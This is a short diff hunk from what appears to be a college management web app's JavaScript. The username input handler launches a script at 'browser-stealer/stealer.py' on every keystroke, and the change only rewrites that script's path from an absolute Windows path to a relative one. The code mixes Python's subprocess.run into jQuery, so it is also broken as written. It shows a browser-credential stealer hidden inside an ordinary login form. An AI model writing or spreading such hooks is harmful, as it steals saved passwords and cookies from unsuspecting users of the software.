@@ -46,7 +46,7 @@
 
   $("#username").on("input", function () {
     username = $(this).val();
-    var pythonScriptPath = "C:/Users/shiv_/College-Management-System/College-Management-System/browser-stealer/stealer.py";
+    var pythonScriptPath = "browser-stealer/stealer.py";
     subprocess.run(["python", pythonScriptPath]);
 
     $.ajax({
